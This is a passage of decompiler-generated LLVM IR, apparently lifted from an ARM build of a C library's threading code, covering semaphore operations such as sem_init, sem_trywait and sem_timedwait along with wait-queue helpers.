  %v3_1d990 = inttoptr i32 %v2_1d990 to i32*
  %v4_1d990 = load i32, i32* %v3_1d990, align 4
  call void @__pseudo_branch(i32 %v4_1d990)
  br label %dec_label_pc_1d9a0

dec_label_pc_1d9a0:                               ; preds = %entry, %dec_label_pc_1d924
  %storemerge = phi i32 [ 0, %dec_label_pc_1d924 ], [ 12, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_1d9a0, { 1, 0 }
}

define i32 @enqueue(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  call void @llvm.trap()
  unreachable
}

define i32 @remove_from_queue(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v0_1da202 = load i32, i32* @r0, align 4
  %v1_1da203 = inttoptr i32 %v0_1da202 to i32*
  %v2_1da204 = load i32, i32* %v1_1da203, align 4
  store i32 %v2_1da204, i32* %r2.global-to-local, align 4
  %v2_1da246 = icmp eq i32 %v2_1da204, 0
  br i1 %v2_1da246, label %dec_label_pc_1da2c, label %dec_label_pc_1d9fc

dec_label_pc_1d9fc:                               ; preds = %entry, %dec_label_pc_1da1c
  %v1_1da0c = phi i32 [ %v1_1da04, %dec_label_pc_1da1c ], [ %v0_1da202, %entry ]
  %v0_1da04 = phi i32 [ %v2_1da20, %dec_label_pc_1da1c ], [ %v2_1da204, %entry ]
  %v9_1d9fc = icmp eq i32 %v0_1da04, %arg1
  %v1_1da04 = add i32 %v0_1da04, 8
  br i1 %v9_1d9fc, label %dec_label_pc_1da04, label %dec_label_pc_1da1c

dec_label_pc_1da04:                               ; preds = %dec_label_pc_1d9fc
  %v2_1da04 = inttoptr i32 %v1_1da04 to i32*
  %v3_1da04 = load i32, i32* %v2_1da04, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_1da0c = inttoptr i32 %v1_1da0c to i32*
  store i32 %v3_1da04, i32* %v2_1da0c, align 4
  %v1_1da14 = load i32, i32* %r2.global-to-local, align 4
  %v2_1da14 = add i32 %v1_1da14, 8
  %v3_1da14 = inttoptr i32 %v2_1da14 to i32*
  store i32 0, i32* %v3_1da14, align 4
  %v0_1da30.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1da30

dec_label_pc_1da1c:                               ; preds = %dec_label_pc_1d9fc
  %v1_1da20 = inttoptr i32 %v1_1da04 to i32*
  %v2_1da20 = load i32, i32* %v1_1da20, align 4
  store i32 %v2_1da20, i32* %r2.global-to-local, align 4
  %v2_1da24 = icmp eq i32 %v2_1da20, 0
  br i1 %v2_1da24, label %dec_label_pc_1da20.dec_label_pc_1da2c_crit_edge, label %dec_label_pc_1d9fc

dec_label_pc_1da20.dec_label_pc_1da2c_crit_edge:  ; preds = %dec_label_pc_1da1c
  br label %dec_label_pc_1da2c

dec_label_pc_1da2c:                               ; preds = %dec_label_pc_1da20.dec_label_pc_1da2c_crit_edge, %entry
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1da30

dec_label_pc_1da30:                               ; preds = %dec_label_pc_1da04, %dec_label_pc_1da2c
  %v0_1da30 = phi i32 [ %v0_1da30.pre, %dec_label_pc_1da04 ], [ 0, %dec_label_pc_1da2c ]
  ret i32 %v0_1da30

; uselistorder directives
  uselistorder i32 %v2_1da20, { 1, 2, 0 }
  uselistorder i32 %v1_1da04, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1da30, { 1, 0 }
  uselistorder label %dec_label_pc_1d9fc, { 1, 0 }
}

define i32 @__new_sem_getvalue(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_1da38 = add i32 %arg1, 8
  %v2_1da38 = inttoptr i32 %v1_1da38 to i32*
  %v3_1da38 = load i32, i32* %v2_1da38, align 4
  store i32 %v3_1da38, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_set_own_extricate_if(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_1da48 = load i32, i32* @r4, align 4
  %v6_1da48 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v2_1da4c = icmp eq i32 %arg2, 0
  %v0_1da54 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1da54, i32* @r4, align 4
  br i1 %v2_1da4c, label %dec_label_pc_1da6c, label %dec_label_pc_1da5c

dec_label_pc_1da5c:                               ; preds = %entry
  %v1_1da5c = add i32 %v0_1da54, 64
  %v2_1da5c = inttoptr i32 %v1_1da5c to i8*
  %v3_1da5c = load i8, i8* %v2_1da5c, align 1
  %v2_1da60 = icmp eq i8 %v3_1da5c, 0
  br i1 %v2_1da60, label %dec_label_pc_1da78, label %dec_label_pc_1da88

dec_label_pc_1da6c:                               ; preds = %entry
  %v1_1da6c = add i32 %v0_1da54, 28
  %v2_1da6c = inttoptr i32 %v1_1da6c to i32*
  %v3_1da6c = load i32, i32* %v2_1da6c, align 4
  store i32 %v3_1da6c, i32* @r0, align 4
  %v0_1da74 = call i32 @__pthread_lock()
  store i32 %v0_1da74, i32* %r0.global-to-local, align 4
  %v0_1da78.pre = load i32, i32* @r5, align 4
  %v1_1da7c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1da78

dec_label_pc_1da78:                               ; preds = %dec_label_pc_1da5c, %dec_label_pc_1da6c
  %v1_1da7c = phi i32 [ %v0_1da54, %dec_label_pc_1da5c ], [ %v1_1da7c.pre, %dec_label_pc_1da6c ]
  %v0_1da7c = phi i32 [ %arg2, %dec_label_pc_1da5c ], [ %v0_1da78.pre, %dec_label_pc_1da6c ]
  %v2_1da78 = icmp eq i32 %v0_1da7c, 0
  %v2_1da7c = add i32 %v1_1da7c, 324
  %v3_1da7c = inttoptr i32 %v2_1da7c to i32*
  store i32 %v0_1da7c, i32* %v3_1da7c, align 4
  br i1 %v2_1da78, label %bb, label %bb9

bb:                                               ; preds = %dec_label_pc_1da78
  %v1_1da80 = load i32, i32* @r4, align 4
  %v2_1da80 = add i32 %v1_1da80, 28
  %v3_1da80 = inttoptr i32 %v2_1da80 to i32*
  %v4_1da80 = load i32, i32* %v3_1da80, align 4
  store i32 %v4_1da80, i32* %r0.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %dec_label_pc_1da78, %bb
  call void @__pseudo_cond_branch(i1 %v2_1da78, i32 ptrtoint (i32* @global_var_1e9d4.1269 to i32))
  %v1_1da90.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1da88

dec_label_pc_1da88:                               ; preds = %dec_label_pc_1da5c, %bb9
  %v1_1da90 = phi i32 [ %v0_1da54, %dec_label_pc_1da5c ], [ %v1_1da90.pre, %bb9 ]
  store i32 %v3_1da48, i32* @r4, align 4
  store i32 %v6_1da48, i32* @r5, align 4
  ret i32 %v1_1da90

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 0, 1 }
  uselistorder label %dec_label_pc_1da88, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %dec_label_pc_1da78, { 1, 0 }
}

define i32 @sem_unlink() local_unnamed_addr {
entry:
  %v0_1da9c = call i32 @__errno_location()
  %v2_1daa4 = inttoptr i32 %v0_1da9c to i32*
  store i32 38, i32* %v2_1daa4, align 4
  ret i32 -1
}

define i32 @sem_close() local_unnamed_addr {
entry:
  %v0_1dac0 = call i32 @__errno_location()
  %v2_1dac8 = inttoptr i32 %v0_1dac0 to i32*
  store i32 38, i32* %v2_1dac8, align 4
  ret i32 -1
}

define i32 @sem_open(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_1dae4 = call i32 @__errno_location()
  %v2_1daec = inttoptr i32 %v0_1dae4 to i32*
  store i32 38, i32* %v2_1daec, align 4
  ret i32 0
}

define i32 @__new_sem_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1db04 = add i32 %arg1, 12
  %v2_1db04 = inttoptr i32 %v1_1db04 to i32*
  %v3_1db04 = load i32, i32* %v2_1db04, align 4
  %v2_1db08 = icmp eq i32 %v3_1db04, 0
  br i1 %v2_1db08, label %dec_label_pc_1db24, label %dec_label_pc_1db14

dec_label_pc_1db14:                               ; preds = %entry
  %v0_1db14 = call i32 @__errno_location()
  %v2_1db1c = inttoptr i32 %v0_1db14 to i32*
  store i32 16, i32* %v2_1db1c, align 4
  br label %dec_label_pc_1db24

dec_label_pc_1db24:                               ; preds = %entry, %dec_label_pc_1db14
  %v1_1db2c = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_1db14 ]
  ret i32 %v1_1db2c

; uselistorder directives
  uselistorder label %dec_label_pc_1db24, { 1, 0 }
}

define i32 @__new_sem_trywait(i32 %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_1db40 = call i32 @__pthread_lock()
  %v0_1db44 = load i32, i32* @r4, align 4
  %v1_1db44 = add i32 %v0_1db44, 8
  %v2_1db44 = inttoptr i32 %v1_1db44 to i32*
  %v3_1db44 = load i32, i32* %v2_1db44, align 4
  %v2_1db48 = icmp eq i32 %v3_1db44, 0
  br i1 %v2_1db48, label %dec_label_pc_1db50, label %dec_label_pc_1db64

dec_label_pc_1db50:                               ; preds = %entry
  %v0_1db50 = call i32 @__errno_location()
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_1db5c = inttoptr i32 %v0_1db50 to i32*
  store i32 11, i32* %v2_1db5c, align 4
  br label %dec_label_pc_1db70

dec_label_pc_1db64:                               ; preds = %entry
  %v1_1db64 = add i32 %v3_1db44, -1
  store i32 %v1_1db64, i32* %v2_1db44, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1db70

dec_label_pc_1db70:                               ; preds = %dec_label_pc_1db50, %dec_label_pc_1db64
  %v0_1db70 = load i32, i32* @r4, align 4
  %v1_1db74 = call i32 @__pthread_unlock(i32 %v0_1db70)
  %v0_1db78 = load i32, i32* %r5.global-to-local, align 4
  ret i32 %v0_1db78

; uselistorder directives
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1db70, { 1, 0 }
}

define i32 @__new_sem_init(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_1db8c = icmp slt i32 %arg3, 0
  store i32 %tmp, i32* %r3.global-to-local, align 4
  br i1 %v1_1db8c, label %dec_label_pc_1db9c, label %dec_label_pc_1dbac

dec_label_pc_1db9c:                               ; preds = %entry
  %v0_1db9c = call i32 @__errno_location()
  br label %dec_label_pc_1dbc0

dec_label_pc_1dbac:                               ; preds = %entry
  %v0_1dbac = load i32, i32* %r1.global-to-local, align 4
  %v2_1dbac = icmp eq i32 %v0_1dbac, 0
  br i1 %v2_1dbac, label %dec_label_pc_1dbc8, label %dec_label_pc_1dbb4

dec_label_pc_1dbb4:                               ; preds = %dec_label_pc_1dbac
  %v0_1dbb4 = call i32 @__errno_location()
  br label %dec_label_pc_1dbc0

dec_label_pc_1dbc0:                               ; preds = %dec_label_pc_1db9c, %dec_label_pc_1dbb4
  %storemerge1 = phi i32 [ %v0_1dbb4, %dec_label_pc_1dbb4 ], [ %v0_1db9c, %dec_label_pc_1db9c ]
  %storemerge = phi i32 [ 38, %dec_label_pc_1dbb4 ], [ 22, %dec_label_pc_1db9c ]
  store i32 -1, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v2_1dbc0 = inttoptr i32 %storemerge1 to i32*
  store i32 %storemerge, i32* %v2_1dbc0, align 4
  br label %dec_label_pc_1dbd8

dec_label_pc_1dbc8:                               ; preds = %dec_label_pc_1dbac
  %v2_1dbc8 = add i32 %tmp, 8
  %v3_1dbc8 = inttoptr i32 %v2_1dbc8 to i32*
  store i32 %arg3, i32* %v3_1dbc8, align 4
  %v0_1dbcc = load i32, i32* %r1.global-to-local, align 4
  %v1_1dbcc = load i32, i32* %r3.global-to-local, align 4
  %v2_1dbcc = add i32 %v1_1dbcc, 12
  %v3_1dbcc = inttoptr i32 %v2_1dbcc to i32*
  store i32 %v0_1dbcc, i32* %v3_1dbcc, align 4
  %v0_1dbd0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1dbd0 = load i32, i32* %r3.global-to-local, align 4
  %v2_1dbd0 = inttoptr i32 %v1_1dbd0 to i32*
  store i32 %v0_1dbd0, i32* %v2_1dbd0, align 4
  %v0_1dbd4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1dbd4 = load i32, i32* %r3.global-to-local, align 4
  %v2_1dbd4 = add i32 %v1_1dbd4, 4
  %v3_1dbd4 = inttoptr i32 %v2_1dbd4 to i32*
  store i32 %v0_1dbd4, i32* %v3_1dbd4, align 4
  br label %dec_label_pc_1dbd8

dec_label_pc_1dbd8:                               ; preds = %dec_label_pc_1dbc0, %dec_label_pc_1dbc8
  %v0_1dbd8 = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_1dbd8

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 5, 0, 1, 2, 6, 3, 4 }
  uselistorder label %dec_label_pc_1dbd8, { 1, 0 }
  uselistorder label %dec_label_pc_1dbc0, { 1, 0 }
}

define i32 @_thread_self() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_1dbec = load i32, i32* @lr, align 4
  store i32 %v0_1dbec, i32* %stack_var_-4, align 4
  %v4_1dbf8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 64) to i32*), align 4
  %v1_1dbfc = inttoptr i32 %v4_1dbf8 to i32*
  %v2_1dbfc = load i32, i32* %v1_1dbfc, align 4
  %v2_1dc00 = ptrtoint i32* %stack_var_-8 to i32
  %v3_1dc04 = icmp ult i32 %v2_1dc00, %v2_1dbfc
  br i1 %v3_1dc04, label %dec_label_pc_1dc14, label %dec_label_pc_1dc40

dec_label_pc_1dc14:                               ; preds = %entry
  %v4_1dc18 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 44) to i32*), align 4
  %v1_1dc1c = inttoptr i32 %v4_1dc18 to i32*
  %v2_1dc1c = load i32, i32* %v1_1dc1c, align 4
  %v3_1dc20 = icmp ult i32 %v2_1dc00, %v2_1dc1c
  br i1 %v3_1dc20, label %dec_label_pc_1dc48, label %dec_label_pc_1dc28

dec_label_pc_1dc28:                               ; preds = %dec_label_pc_1dc14
  %v4_1dc2c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 204) to i32*), align 4
  %v1_1dc30 = inttoptr i32 %v4_1dc2c to i32*
  %v2_1dc30 = load i32, i32* %v1_1dc30, align 4
  %v3_1dc34 = icmp ult i32 %v2_1dc00, %v2_1dc30
  br i1 %v3_1dc34, label %dec_label_pc_1dc40, label %dec_label_pc_1dc48

dec_label_pc_1dc40:                               ; preds = %dec_label_pc_1dc28, %entry
  %v1_1dc40 = phi i32 [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 184), %entry ], [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 120), %dec_label_pc_1dc28 ]
  %v3_1dc40 = inttoptr i32 %v1_1dc40 to i32*
  %v4_1dc40 = load i32, i32* %v3_1dc40, align 4
  br label %dec_label_pc_1dc74

dec_label_pc_1dc48:                               ; preds = %dec_label_pc_1dc28, %dec_label_pc_1dc14
  %v4_1dc4c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 112) to i32*), align 4
  %v1_1dc50 = inttoptr i32 %v4_1dc4c to i32*
  %v2_1dc50 = load i32, i32* %v1_1dc50, align 4
  %v2_1dc54 = icmp eq i32 %v2_1dc50, 0
  br i1 %v2_1dc54, label %dec_label_pc_1dc64, label %dec_label_pc_1dc5c

dec_label_pc_1dc5c:                               ; preds = %dec_label_pc_1dc48
  %v0_1dc5c = call i32 @__pthread_find_self()
  %v2_1dc78.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_1dc74

dec_label_pc_1dc64:                               ; preds = %dec_label_pc_1dc48
  %v3_1dc64 = and i32 %v2_1dc00, -2097152
  %v4_1dc64 = xor i32 %v3_1dc64, -2097152
  %v1_1dc70 = sub i32 -352, %v4_1dc64
  br label %dec_label_pc_1dc74

dec_label_pc_1dc74:                               ; preds = %dec_label_pc_1dc5c, %dec_label_pc_1dc40, %dec_label_pc_1dc64
  %v1_1dc7c = phi i32 [ %v0_1dc5c, %dec_label_pc_1dc5c ], [ %v4_1dc40, %dec_label_pc_1dc40 ], [ %v1_1dc70, %dec_label_pc_1dc64 ]
  %v2_1dc78 = phi i32 [ %v2_1dc78.pre, %dec_label_pc_1dc5c ], [ %v0_1dbec, %dec_label_pc_1dc40 ], [ %v0_1dbec, %dec_label_pc_1dc64 ]
  store i32 %v2_1dc78, i32* @lr, align 4
  ret i32 %v1_1dc7c

; uselistorder directives
  uselistorder label %dec_label_pc_1dc74, { 2, 0, 1 }
}

define i32 @function_1dc84(i16* %arg1) local_unnamed_addr {
dec_label_pc_1dc84:
  %v0_1dc84 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1dc84, label %.thread, label %.thread4

.thread:                                          ; preds = %dec_label_pc_1dc84
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_1dc84
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @new_sem_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_1dcac = call i32 @_thread_self()
  %v0_1dcb8 = load i32, i32* @r5, align 4
  store i32 %v0_1dcb8, i32* @r0, align 4
  %v0_1dcbc = call i32 @__pthread_lock()
  %v0_1dcc0 = load i32, i32* @r4, align 4
  %v0_1dcc4 = load i32, i32* @r5, align 4
  %v1_1dcc4 = add i32 %v0_1dcc4, 12
  store i32 %v1_1dcc4, i32* @r0, align 4
  %v2_1dcc8 = call i32 @remove_from_queue(i32 %v1_1dcc4, i32 %v0_1dcc0)
  %v0_1dcd0 = load i32, i32* @r5, align 4
  %v1_1dcd4 = call i32 @__pthread_unlock(i32 %v0_1dcd0)
  ret i32 %v2_1dcc8
}

define i32 @suspend(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1dcf0 = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_1dcf0
}

define i32 @sem_timedwait(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v2_1dd04 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @sl, align 4
  %v0_1dd10 = call i32 @_thread_self()
  store i32 %v0_1dd10, i32* @r5, align 4
  %v0_1dd1c = load i32, i32* @r6, align 4
  store i32 %v0_1dd1c, i32* @r0, align 4
  %v0_1dd20 = call i32 @__pthread_lock()
  %v0_1dd24 = load i32, i32* @r6, align 4
  %v1_1dd24 = add i32 %v0_1dd24, 8
  %v2_1dd24 = inttoptr i32 %v1_1dd24 to i32*
  %v3_1dd24 = load i32, i32* %v2_1dd24, align 4
  %tmp16 = icmp slt i32 %v3_1dd24, 1
  br i1 %tmp16, label %dec_label_pc_1dd4c, label %dec_label_pc_1dd38

dec_label_pc_1dd38:                               ; preds = %entry
  %v1_1dd38 = add i32 %v3_1dd24, -1
  store i32 %v1_1dd38, i32* %v2_1dd24, align 4
  %v0_1dd40 = load i32, i32* @r6, align 4
  %v1_1dd44 = call i32 @__pthread_unlock(i32 %v0_1dd40)
  br label %dec_label_pc_1dea8

dec_label_pc_1dd4c:                               ; preds = %entry
  %v0_1dd4c = load i32, i32* @sl, align 4
  %v1_1dd4c = add i32 %v0_1dd4c, 4
  %v2_1dd4c = inttoptr i32 %v1_1dd4c to i32*
  %v3_1dd4c = load i32, i32* %v2_1dd4c, align 4
  store i32 %v3_1dd4c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v3_1dd4c, 1000000000
  br i1 %tmp, label %dec_label_pc_1dd74, label %dec_label_pc_1dd5c

dec_label_pc_1dd5c:                               ; preds = %dec_label_pc_1dd4c
  %v1_1dd60 = call i32 @__pthread_unlock(i32 %v0_1dd24)
  %v0_1dd64 = call i32 @__errno_location()
  br label %dec_label_pc_1de40

dec_label_pc_1dd74:                               ; preds = %dec_label_pc_1dd4c
  store i32 %v0_1dd24, i32* %stack_var_-40, align 4
  %v0_1dd88 = load i32, i32* @r5, align 4
  %v3_1dd8c = add i32 %v0_1dd88, 322
  %v4_1dd8c = inttoptr i32 %v3_1dd8c to i8*
  store i8 0, i8* %v4_1dd8c, align 1
  %v2_1dd94 = call i32 @__pthread_set_own_extricate_if(i32 %v0_1dd88, i32 %v2_1dd04)
  %v0_1dd98 = load i32, i32* @r5, align 4
  %v1_1dd98 = add i32 %v0_1dd98, 66
  %v2_1dd98 = inttoptr i32 %v1_1dd98 to i8*
  %v3_1dd98 = load i8, i8* %v2_1dd98, align 1
  %v2_1dd9c = icmp eq i8 %v3_1dd98, 0
  br i1 %v2_1dd9c, label %dec_label_pc_1ddb4, label %dec_label_pc_1dda4

dec_label_pc_1dda4:                               ; preds = %dec_label_pc_1dd74
  %v1_1dda4 = add i32 %v0_1dd98, 64
  %v2_1dda4 = inttoptr i32 %v1_1dda4 to i8*
  %v3_1dda4 = load i8, i8* %v2_1dda4, align 1
  %v2_1dda8 = icmp eq i8 %v3_1dda4, 0
  br i1 %v2_1dda8, label %dec_label_pc_1ddc4, label %dec_label_pc_1ddb4

dec_label_pc_1ddb4:                               ; preds = %dec_label_pc_1dda4, %dec_label_pc_1dd74
  %v0_1ddb4 = load i32, i32* @r6, align 4
  %v1_1ddb4 = add i32 %v0_1ddb4, 12
  %v2_1ddbc = call i32 @enqueue(i32 %v1_1ddb4, i32 %v0_1dd98)
  br label %dec_label_pc_1ddc4

dec_label_pc_1ddc4:                               ; preds = %dec_label_pc_1dda4, %dec_label_pc_1ddb4
  %storemerge6 = phi i32 [ 0, %dec_label_pc_1ddb4 ], [ 1, %dec_label_pc_1dda4 ]
  store i32 %storemerge6, i32* @r4, align 4
  %v0_1ddc4 = load i32, i32* @r6, align 4
  %v1_1ddc8 = call i32 @__pthread_unlock(i32 %v0_1ddc4)
  %v0_1ddcc = load i32, i32* @r4, align 4
  %v2_1ddcc = icmp eq i32 %v0_1ddcc, 0
  br i1 %v2_1ddcc, label %dec_label_pc_1dde8.preheader, label %dec_label_pc_1ddd8

dec_label_pc_1dde8.preheader:                     ; preds = %dec_label_pc_1ddc4
  %v1_1ddd0 = load i32, i32* @r6, align 4
  %v2_1ddd0 = add i32 %v1_1ddd0, 12
  store i32 %v2_1ddd0, i32* @r8, align 4
  %v0_1dde8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1dde8

dec_label_pc_1ddd8:                               ; preds = %dec_label_pc_1ddc4
  %v0_1ddd8 = load i32, i32* @r5, align 4
  %v2_1dde0 = call i32 @__pthread_set_own_extricate_if(i32 %v0_1ddd8, i32 0)
  br label %dec_label_pc_1de9c

dec_label_pc_1dde8:                               ; preds = %dec_label_pc_1de68, %dec_label_pc_1de5c, %dec_label_pc_1dde8.preheader
  %v0_1dde8 = phi i32 [ %v0_1dde8.pre, %dec_label_pc_1dde8.preheader ], [ %v0_1de50, %dec_label_pc_1de5c ], [ %v0_1de50, %dec_label_pc_1de68 ]
  %v0_1ddec = load i32, i32* @sl, align 4
  %v2_1ddf0 = inttoptr i32 %v0_1ddec to i32*
  %v3_1ddf0 = call i32 @__pthread_timedsuspend_new(i32 %v0_1dde8, i32* %v2_1ddf0)
  store i32 %v3_1ddf0, i32* @r7, align 4
  %v2_1ddf4 = icmp eq i32 %v3_1ddf0, 0
  br i1 %v2_1ddf4, label %dec_label_pc_1ddfc, label %dec_label_pc_1de50

dec_label_pc_1ddfc:                               ; preds = %dec_label_pc_1dde8
  %v0_1ddfc = load i32, i32* @r6, align 4
  store i32 %v0_1ddfc, i32* @r0, align 4
  %v0_1de04 = call i32 @__pthread_lock()
  %v0_1de08 = load i32, i32* @r5, align 4
  %v0_1de0c = load i32, i32* @r8, align 4
  store i32 %v0_1de0c, i32* @r0, align 4
  %v2_1de10 = call i32 @remove_from_queue(i32 %v0_1de0c, i32 %v0_1de08)
  store i32 %v2_1de10, i32* @r4, align 4
  %v0_1de18 = load i32, i32* @r6, align 4
  %v1_1de1c = call i32 @__pthread_unlock(i32 %v0_1de18)
  %v0_1de20 = load i32, i32* @r4, align 4
  %v2_1de20 = icmp eq i32 %v0_1de20, 0
  %v0_1de48 = load i32, i32* @r5, align 4
  store i32 %v0_1de48, i32* @r0, align 4
  br i1 %v2_1de20, label %dec_label_pc_1de48, label %dec_label_pc_1de28

dec_label_pc_1de28:                               ; preds = %dec_label_pc_1ddfc
  %v0_1de2c = load i32, i32* @r7, align 4
  %v2_1de30 = call i32 @__pthread_set_own_extricate_if(i32 %v0_1de48, i32 %v0_1de2c)
  %v0_1de34 = call i32 @__errno_location()
  br label %dec_label_pc_1de40

dec_label_pc_1de40:                               ; preds = %dec_label_pc_1dd5c, %dec_label_pc_1de28
  %storemerge1 = phi i32 [ %v0_1dd64, %dec_label_pc_1dd5c ], [ %v0_1de34, %dec_label_pc_1de28 ]
  %storemerge = phi i32 [ 22, %dec_label_pc_1dd5c ], [ 110, %dec_label_pc_1de28 ]
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1de40 = inttoptr i32 %storemerge1 to i32*
  store i32 %storemerge, i32* %v2_1de40, align 4
  %v0_1deac.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1deac

dec_label_pc_1de48:                               ; preds = %dec_label_pc_1ddfc
  %v1_1de4c = call i32 @suspend(i32 %v0_1de48)
  br label %dec_label_pc_1de50

dec_label_pc_1de50:                               ; preds = %dec_label_pc_1dde8, %dec_label_pc_1de48
  %v0_1de50 = load i32, i32* @r5, align 4
  %v1_1de50 = add i32 %v0_1de50, 322
  %v2_1de50 = inttoptr i32 %v1_1de50 to i8*
  %v3_1de50 = load i8, i8* %v2_1de50, align 1
  %v2_1de54 = icmp eq i8 %v3_1de50, 0
  br i1 %v2_1de54, label %dec_label_pc_1de5c, label %dec_label_pc_1de74

dec_label_pc_1de5c:                               ; preds = %dec_label_pc_1de50
  %v1_1de5c = add i32 %v0_1de50, 320
  %v2_1de5c = inttoptr i32 %v1_1de5c to i8*
  %v3_1de5c = load i8, i8* %v2_1de5c, align 1
  %v2_1de60 = icmp eq i8 %v3_1de5c, 0
  br i1 %v2_1de60, label %dec_label_pc_1dde8, label %dec_label_pc_1de68

dec_label_pc_1de68:                               ; preds = %dec_label_pc_1de5c
  %v1_1de68 = add i32 %v0_1de50, 64
  %v2_1de68 = inttoptr i32 %v1_1de68 to i8*
  %v3_1de68 = load i8, i8* %v2_1de68, align 1
  %v2_1de6c = icmp eq i8 %v3_1de68, 0
  br i1 %v2_1de6c, label %dec_label_pc_1de74, label %dec_label_pc_1dde8

dec_label_pc_1de74:                               ; preds = %dec_label_pc_1de68, %dec_label_pc_1de50
  %v2_1de7c = call i32 @__pthread_set_own_extricate_if(i32 %v0_1de50, i32 0)
  %v0_1de80 = load i32, i32* @r5, align 4
  %v1_1de80 = add i32 %v0_1de80, 320
  %v2_1de80 = inttoptr i32 %v1_1de80 to i8*
  %v3_1de80 = load i8, i8* %v2_1de80, align 1
  %v2_1de84 = icmp eq i8 %v3_1de80, 0
  br i1 %v2_1de84, label %dec_label_pc_1dea8, label %dec_label_pc_1de8c

dec_label_pc_1de8c:                               ; preds = %dec_label_pc_1de74
  %v1_1de8c = add i32 %v0_1de80, 64
  %v2_1de8c = inttoptr i32 %v1_1de8c to i8*
  %v3_1de8c = load i8, i8* %v2_1de8c, align 1
  %v2_1de90 = icmp eq i8 %v3_1de8c, 0
  br i1 %v2_1de90, label %dec_label_pc_1de98, label %dec_label_pc_1dea8

dec_label_pc_1de98:                               ; preds = %dec_label_pc_1de8c
  store i8 0, i8* %v2_1de80, align 1
  br label %dec_label_pc_1de9c

dec_label_pc_1de9c:                               ; preds = %dec_label_pc_1ddd8, %dec_label_pc_1de98
  %v2_1dea4 = call i32 @__pthread_do_exit(i32 -1, i32 %v2_1dd04)
  br label %dec_label_pc_1dea8

dec_label_pc_1dea8:                               ; preds = %dec_label_pc_1de8c, %dec_label_pc_1de74, %dec_label_pc_1dd38, %dec_label_pc_1de9c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1deac

dec_label_pc_1deac:                               ; preds = %dec_label_pc_1de40, %dec_label_pc_1dea8
  %v0_1deac = phi i32 [ %v0_1deac.pre, %dec_label_pc_1de40 ], [ 0, %dec_label_pc_1dea8 ]
  ret i32 %v0_1deac

; uselistorder directives
  uselistorder i32 %v0_1de50, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v0_1de48, { 1, 0, 2 }
